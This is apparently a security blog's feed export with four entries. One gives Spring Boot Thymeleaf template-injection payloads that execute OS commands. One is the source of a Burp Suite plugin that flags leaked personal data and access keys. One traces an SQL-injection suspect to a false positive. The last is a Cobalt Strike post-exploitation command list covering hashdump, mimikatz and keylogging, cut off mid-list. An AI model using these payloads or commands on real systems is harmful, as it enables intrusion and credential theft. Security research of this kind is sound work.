    <content type="html"><![CDATA[<h1 id="一、在查找模板中，引用了用户输入的内容"><a href="#一、在查找模板中，引用了用户输入的内容" class="headerlink" title="一、在查找模板中，引用了用户输入的内容"></a>一、在查找模板中，引用了用户输入的内容</h1><h2 id="demo："><a href="#demo：" class="headerlink" title="demo："></a>demo：</h2><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/path&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">path</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String lang)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span>  lang ; <span class="hljs-comment">//template path is tainted</span><br>    &#125;<br></code></pre></div></td></tr></table></figure><p>payload：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">/path?lang=__<span class="hljs-variable">$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;id&quot;).getInputStream()).next()&#125;</span>__::.x<br></code></pre></div></td></tr></table></figure><h1 id="二、根据spring-boot定义"><a href="#二、根据spring-boot定义" class="headerlink" title="二、根据spring boot定义"></a>二、根据spring boot定义</h1><p>如果controller无返回值，则以GetMapping的路由为视图名称。当然，对于每个http请求来讲，其实就是将请求的url作为视图名称，调用模板引擎去解析</p><h2 id="demo：-1"><a href="#demo：-1" class="headerlink" title="demo："></a>demo：</h2><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/doc/&#123;document&#125;&quot;)</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">getDocument</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String document)</span> </span>&#123;<br>    log.info(<span class="hljs-string">&quot;Retrieving &quot;</span> + document);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>payload：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">/doc/__<span class="hljs-variable">$&#123;T(java.lang.Runtime).getRuntime().exec(&quot;touch executed&quot;)&#125;</span>__::.x<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>spring boot模板注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>burpsuite高亮插件</title>
    <link href="/2020/09/11/30/"/>
    <url>/2020/09/11/30/</url>
    
    <content type="html"><![CDATA[<p>插件为python环境开发<br>自定义信息单独泄露和组合泄露高亮颜色<br><img src="/images/30/1.png"><br>当发生信息泄露以外的情况时标其他颜色，比如脚本攻击：<br><img src="/images/30/2.png"><br>自定义正则：<br><img src="/images/30/3.png"><br>示例：<br>使用插件后访问写好的目标，点击HTTP history就可以看到高亮请求，点进请求后会有个Keyword栏标出相应信息<br>效果图<br><img src="/images/30/4.png"><br>用法：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">burpsuite - Extender - Add<br></code></pre></div></td></tr></table></figure><p>ps：目前因为不懂正则的原因未完成userpss及orderid，ip（内网）正则有缺陷，xss正则待完善<br>可以自定义其他漏洞挖掘功能，只需要一点点的python基础</p><h1 id="CODE"><a href="#CODE" class="headerlink" title="CODE"></a>CODE</h1><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><span class="hljs-comment"># Improve: by novy</span><br><br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">from</span> burp <span class="hljs-keyword">import</span> IBurpExtender<br><span class="hljs-keyword">from</span> burp <span class="hljs-keyword">import</span> IHttpListener<br><span class="hljs-keyword">from</span> burp <span class="hljs-keyword">import</span> IMessageEditorTab<br><span class="hljs-keyword">from</span> burp <span class="hljs-keyword">import</span> IMessageEditorTabFactory<br><br><span class="hljs-keyword">from</span> java.io <span class="hljs-keyword">import</span> PrintWriter<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BurpExtender</span>(<span class="hljs-params">IBurpExtender, IHttpListener, IMessageEditorTabFactory</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">registerExtenderCallbacks</span>(<span class="hljs-params">self, callbacks</span>):</span><br>        self._callbacks = callbacks<br>        self._helpers = callbacks.getHelpers()<br>        callbacks.setExtensionName(<span class="hljs-string">&quot;Spartan - Wheel king&quot;</span>)<br>        self._stdout = PrintWriter(callbacks.getStdout(), <span class="hljs-literal">True</span>)<br>        callbacks.registerHttpListener(self)<br>        callbacks.registerMessageEditorTabFactory(self)<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        [+] #####################################</span><br><span class="hljs-string">        [+] chao bie ren de</span><br><span class="hljs-string">        [+] Improve: novy</span><br><span class="hljs-string">        [+] novy.baklib.com</span><br><span class="hljs-string">        Readme:</span><br><span class="hljs-string">        [+] Leakage of regular information such as order number, mobile phone number, account password, ID card, etc.</span><br><span class="hljs-string">        [+] Yellow represents a single information leak, red represents multiple information leaks</span><br><span class="hljs-string">        [+] Please add more functions by yourself, support unlimited customization</span><br><span class="hljs-string">        [+] Not just for mining information leakage.You can create your own plug-in with just a little knowledge of python</span><br><span class="hljs-string">        [+] #####################################</span><br><span class="hljs-string">        &#x27;&#x27;&#x27;</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">createNewInstance</span>(<span class="hljs-params">self, controller, editable</span>):</span><br>        <span class="hljs-keyword">return</span> MarkINFOTab(self, controller, editable)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">processHttpMessage</span>(<span class="hljs-params">self, toolFlag, messageIsRequest, messageInfo</span>):</span><br>        <span class="hljs-keyword">if</span> messageIsRequest:<br>            <span class="hljs-keyword">return</span><br>        content = messageInfo.getResponse()<br>        r = self._helpers.analyzeResponse(content)<br>        msg = content[r.getBodyOffset():].tostring()<br><br>        <span class="hljs-keyword">if</span> isPhone(msg) <span class="hljs-keyword">or</span> isIdCard(msg) <span class="hljs-keyword">or</span> isEmail(msg) <span class="hljs-keyword">or</span> ossinfo(msg) <span class="hljs-keyword">or</span> ipaddress(msg) <span class="hljs-keyword">or</span> userpass(msg) <span class="hljs-keyword">or</span> orderid(msg):<br>            messageInfo.setHighlight(<span class="hljs-string">&#x27;yellow&#x27;</span>)<br><br>        <span class="hljs-keyword">if</span> (isPhone(msg) <span class="hljs-keyword">and</span> isIdCard(msg)) <span class="hljs-keyword">or</span> (isPhone(msg) <span class="hljs-keyword">and</span> isEmail(msg)) <span class="hljs-keyword">or</span> (isIdCard(msg) <span class="hljs-keyword">and</span> isEmail(msg)) <span class="hljs-keyword">or</span> (ipaddress(msg) <span class="hljs-keyword">and</span> userpass(msg)) <span class="hljs-keyword">or</span> (ossinfo(msg) <span class="hljs-keyword">and</span> ipaddress(msg)) <span class="hljs-keyword">or</span> (isEmail(msg) <span class="hljs-keyword">and</span> ossinfo(msg)) <span class="hljs-keyword">or</span> (userpass(msg) <span class="hljs-keyword">and</span> orderid(msg)):<br>            messageInfo.setHighlight(<span class="hljs-string">&#x27;red&#x27;</span>)<br><br>      <span class="hljs-comment">#  if xsspayload(msg):</span><br>       <span class="hljs-comment">#  messageInfo.setHighlight(&#x27;blue&#x27;)</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MarkINFOTab</span>(<span class="hljs-params">IMessageEditorTab</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, extender, controller, editable</span>):</span><br>        self._extender = extender<br>        self._helpers = extender._helpers<br>        self._editable = editable<br>        self._txtInput = extender._callbacks.createTextEditor()<br>        self._txtInput.setEditable(editable)<br>        self.isInfo = <span class="hljs-literal">False</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getTabCaption</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Keyword&quot;</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getUiComponent</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">return</span> self._txtInput.getComponent()<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">isEnabled</span>(<span class="hljs-params">self, content, isRequest</span>):</span><br>        r = self._helpers.analyzeResponse(content)<br>        msg = content[r.getBodyOffset():].tostring()<br>        iphone = isPhone(msg)<br>        email = isEmail(msg)<br>        idcard = isIdCard(msg)<br>        oss = ossinfo(msg)<br>        address = ipaddress(msg)<br>        userp = userpass(msg)<br>        order = orderid(msg)<br>      <span class="hljs-comment">#  payload = xsspayload(msg)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> isRequest:<br>            <span class="hljs-keyword">if</span> iphone <span class="hljs-keyword">or</span> email <span class="hljs-keyword">or</span> idcard <span class="hljs-keyword">or</span> oss <span class="hljs-keyword">or</span> address <span class="hljs-keyword">or</span> userp <span class="hljs-keyword">or</span> order:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">setMessage</span>(<span class="hljs-params">self, content, isRequest</span>):</span><br>        <span class="hljs-keyword">if</span> content:<br>            <span class="hljs-keyword">if</span> isRequest:<br>                r = self._helpers.analyzeRequest(content)<br>            <span class="hljs-keyword">else</span>:<br>                r = self._helpers.analyzeResponse(content)<br>            msg = content[r.getBodyOffset():].tostring()<br>            info = <span class="hljs-string">&quot;&quot;</span><br>            iphone = isPhone(msg)<br>            email = isEmail(msg)<br>            idcard = isIdCard(msg)<br>            oss = ossinfo(msg)<br>            address = ipaddress(msg)<br>            userp = userpass(msg)<br>            order = orderid(msg)<br>         <span class="hljs-comment">#   payload = xsspayload(msg)</span><br>            <span class="hljs-keyword">if</span> iphone:<br>                info += <span class="hljs-string">&#x27;[Phone] &#x27;</span> + <span class="hljs-string">&#x27;,&#x27;</span>.join(iphone) + <span class="hljs-string">&#x27;\n&#x27;</span><br><br>            <span class="hljs-keyword">if</span> email:<br>                info += <span class="hljs-string">&#x27;[Mail] &#x27;</span> + <span class="hljs-string">&#x27;,&#x27;</span>.join(email) + <span class="hljs-string">&#x27;\n&#x27;</span><br><br>            <span class="hljs-keyword">if</span> idcard:<br>                info += <span class="hljs-string">&#x27;[IDCard] &#x27;</span> + <span class="hljs-string">&#x27;,&#x27;</span>.join(idcard) + <span class="hljs-string">&#x27;\n&#x27;</span><br><br>            <span class="hljs-keyword">if</span> oss:<br>                info += <span class="hljs-string">&#x27;[Oss] &#x27;</span> + <span class="hljs-string">&#x27;,&#x27;</span>.join(oss) + <span class="hljs-string">&#x27;\n&#x27;</span><br><br>            <span class="hljs-keyword">if</span> address:<br>                info += <span class="hljs-string">&#x27;[Address] &#x27;</span> + <span class="hljs-string">&#x27;,&#x27;</span>.join(address) + <span class="hljs-string">&#x27;\n&#x27;</span><br><br>            <span class="hljs-keyword">if</span> userp:<br>                info += <span class="hljs-string">&#x27;[Userp] &#x27;</span> + <span class="hljs-string">&#x27;,&#x27;</span>.join(userp) + <span class="hljs-string">&#x27;\n&#x27;</span><br><br>            <span class="hljs-keyword">if</span> order:<br>                info += <span class="hljs-string">&#x27;[Order] &#x27;</span> + <span class="hljs-string">&#x27;,&#x27;</span>.join(order) + <span class="hljs-string">&#x27;\n&#x27;</span><br><br>      <span class="hljs-comment">#      if payload:</span><br>            <span class="hljs-comment">#    info += &#x27;[Payload] &#x27; + &#x27;,&#x27;.join(payload) + &#x27;\n&#x27;</span><br><br>            self._txtInput.setText(info)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">isPhone</span>(<span class="hljs-params">string</span>):</span><br>    iphones = re.findall(<span class="hljs-string">r&#x27;((13[0-9]|14[5-9]|15[012356789]|166|17[0-8]|18[0-9]|19[8-9])[0-9]&#123;8&#125;)&#x27;</span>, string)<br>    res = []<br>    <span class="hljs-keyword">if</span> iphones != []:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> iphones:<br>            lens = string.find(i[<span class="hljs-number">0</span>])<br>            <span class="hljs-keyword">if</span> (string[lens<span class="hljs-number">-1</span>:lens].isdigit()) <span class="hljs-keyword">or</span> (string[lens+<span class="hljs-number">11</span>:lens+<span class="hljs-number">12</span>].isdigit()):<br>                <span class="hljs-keyword">pass</span><br>            <span class="hljs-keyword">else</span>:<br>                res.append(i[<span class="hljs-number">0</span>])<br>        <span class="hljs-keyword">if</span> res != []:<br>            <span class="hljs-keyword">return</span> res<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">isIdCard</span>(<span class="hljs-params">string</span>):</span><br>    coefficient = [<span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>]<br>    parityBit = <span class="hljs-string">&#x27;10X98765432&#x27;</span><br>    idcards = re.findall(<span class="hljs-string">r&#x27;([1-9]\d&#123;5&#125;[1-9]\d&#123;3&#125;((0\d)|(1[0-2]))(([0|1|2]\d)|3[0-1])((\d&#123;4&#125;)|\d&#123;3&#125;[xX]))&#x27;</span>, string)<br>    res = []<br>    <span class="hljs-keyword">if</span> idcards != []:<br>        <span class="hljs-keyword">for</span> idcard <span class="hljs-keyword">in</span> idcards:<br>            sumnumber = <span class="hljs-number">0</span><br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">17</span>):<br>                sumnumber += <span class="hljs-built_in">int</span>(idcard[<span class="hljs-number">0</span>][i]) * coefficient[i]<br>            <span class="hljs-keyword">if</span> parityBit[sumnumber % <span class="hljs-number">11</span>] == idcard[<span class="hljs-number">0</span>][<span class="hljs-number">-1</span>]:<br>                res.append(idcard[<span class="hljs-number">0</span>])<br>        <span class="hljs-keyword">if</span> res != []:<br>            <span class="hljs-keyword">return</span> res<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">isEmail</span>(<span class="hljs-params">string</span>):</span><br>    emails = re.findall(<span class="hljs-string">r&#x27;[a-z0-9A-Z_]&#123;1,19&#125;@[0-9a-zA-Z]&#123;1,13&#125;\.[a-z]&#123;1,6&#125;&#x27;</span>, string)<br>    <span class="hljs-keyword">if</span> emails != [<span class="hljs-string">&#x27;&#x27;</span>]:<br>        <span class="hljs-keyword">return</span> emails<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ossinfo</span>(<span class="hljs-params">string</span>):</span><br>    ossinfom = re.findall(<span class="hljs-string">r&#x27;([A|a]ccess[K|k]ey[I|i]d|[A|a]ccess[K|k]ey[S|s]ecret)&#x27;</span>, string)<br>    <span class="hljs-keyword">if</span> ossinfom != [<span class="hljs-string">&#x27;&#x27;</span>]:<br>        <span class="hljs-keyword">return</span> ossinfom<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ipaddress</span>(<span class="hljs-params">string</span>):</span><br>    addressip = re.findall(<span class="hljs-string">r&#x27;(?:10\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;)|(?:172\.(?:(?:1[6-9])|(?:2\d)|(?:3[01]))\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;)|(?:192\.168\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;)&#x27;</span>, string)<br>    <span class="hljs-keyword">if</span> addressip != [<span class="hljs-string">&#x27;&#x27;</span>]:<br>        <span class="hljs-keyword">return</span> addressip<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">userpass</span>(<span class="hljs-params">string</span>):</span><br>    passuser = re.findall(<span class="hljs-string">r&#x27;(i?)\S.*[user]&#x27;</span>, string)<br>    <span class="hljs-keyword">if</span> passuser != [<span class="hljs-string">&#x27;&#x27;</span>]:<br>        <span class="hljs-keyword">return</span> passuser<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">orderid</span>(<span class="hljs-params">string</span>):</span><br>    orid = re.findall(<span class="hljs-string">r&#x27;(^\d&#123;8,18&#125;$)&#x27;</span>, string)<br>    <span class="hljs-keyword">if</span> orid != [<span class="hljs-string">&#x27;&#x27;</span>]:<br>        <span class="hljs-keyword">return</span> orid<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-comment">#def xsspayload(string):</span><br> <span class="hljs-comment">#   xss = re.findall(r&#x27;&#x27;, string)</span><br> <span class="hljs-comment">#   if xss != [&#x27;&#x27;]:</span><br>  <span class="hljs-comment">#      return xss</span><br> <span class="hljs-comment">#   else:</span><br>  <span class="hljs-comment">#      return False</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>插件</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>springmvc SQL注入逆向跟进</title>
    <link href="/2020/09/10/29/"/>
    <url>/2020/09/10/29/</url>
    
    <content type="html"><![CDATA[<p>首先看一处可疑的order by注入点<br><img src="/images/29/1.png"><br>往上看它属于哪个select id并跟进这个id<br><img src="/images/29/2.png"><br>ctrl+h全局搜索<br><img src="/images/29/3.png"><br>可以看到这个方法定义了字符串参数ordersql，往下看它的实现类<br><img src="/images/29/4.png"><br>用<code>cataWithPicInfos</code>接收<code>allCataWithPicInfo</code>查询返回的结果，往上看它属于哪个方法并跟进查看哪个controller用到了这个方法<br><img src="/images/29/5.png"><br><img src="/images/29/6.png"><br>自此流程就结束了，这个可疑点是不存在的，在实现类里ordersql就已经被写死了<br><img src="/images/29/7.png"></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cobalt Strike常用命令</title>
    <link href="/2020/09/10/20/"/>
    <url>/2020/09/10/20/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">browserpivot              注入受害者浏览器进程<br>    bypassuac                 绕过UAC<br>    cancel                    取消正在进行的下载<br>    <span class="hljs-built_in">cd</span>                        切换目录<br>    checkin                   强制让被控端回连一次<br>    clear                     清除beacon内部的任务队列<br>    connect                   Connect to a Beacon peerover TCP<br>    covertvpn                 部署Covert VPN客户端<br>    cp                        复制文件<br>    dcsync                    从DC中提取密码哈希<br>    desktop                   远程VNC<br>    dllinject                 反射DLL注入进程<br>    dllload                   使用LoadLibrary将DLL加载到进程中<br>    download                  下载文件<br>    downloads                 列出正在进行的文件下载<br>    drives                    列出目标盘符<br>    elevate                   尝试提权<br>   execute                   在目标上执行程序(无输出)<br>    execute-assembly          在目标上内存中执行本地.NET程序<br>    <span class="hljs-built_in">exit</span>                      退出beacon<br>    getprivs                  Enable system privileges oncurrent token<br>    getsystem                 尝试获取SYSTEM权限<br>    getuid                    获取用户ID<br>    hashdump                  转储密码哈希值<br>    <span class="hljs-built_in">help</span>                      帮助<br>    inject                    在特定进程中生成会话<br>    jobkill                   杀死一个后台任务<br>    <span class="hljs-built_in">jobs</span>                      列出后台任务<br>    kerberos_ccache_use       从ccache文件中导入票据应用于此会话<br>    kerberos_ticket_purge     清除当前会话的票据<br>    kerberos_ticket_use       从ticket文件中导入票据应用于此会话<br>    keylogger                 键盘记录<br>    <span class="hljs-built_in">kill</span>                      结束进程<br>    link                      Connect to a Beacon peerover a named pipe<br>    logonpasswords            使用mimikatz转储凭据和哈希值<br>    ls                        列出文件<br>    make_token                创建令牌以传递凭据<br>    mimikatz                  运行mimikatz<br>    mkdir                     创建一个目录<br>    mode dns                  使用DNS A作为通信通道(仅限DNS beacon)<br>    mode dns-txt              使用DNS TXT作为通信通道(仅限D beacon)<br>    mode dns6                 使用DNS AAAA作为通信通道(仅限DNS beacon)<br>    mode http                 使用HTTP作为通信通道<br>    mv                        移动文件<br>    net                       net命令<br>    note                      备注      <br>    portscan                  进行端口扫描<br>    powerpick                 通过Unmanaged PowerShell执行命令<br>    powershell                通过powershell.exe执行命令<br>    powershell-import         导入powershell脚本<br>    ppid                      Set parent PID forspawned post-ex <span class="hljs-built_in">jobs</span><br>    ps                        显示进程列表<br>    psexec                    Use a service to spawn asession on a host<br>    psexec_psh                Use PowerShell to spawn asession on a host<br>    psinject                  在特定进程中执行PowerShell命令<br>    pth                       使用Mimikatz进行传递哈希<br>    <span class="hljs-built_in">pwd</span>                       当前目录位置<br>    reg                       Query the registry<br>    rev2self                  恢复原始令牌<br>    rm                        删除文件或文件夹<br>    rportfwd                  端口转发<br>    run                       在目标上执行程序(返回输出)<br>    runas                     以另一个用户权限执行程序<br>    runasadmin                在高权限下执行程序<br>    runu                      Execute a program underanother PID<br>    screenshot                屏幕截图<br>    setenv                    设置环境变量<br>    shell                     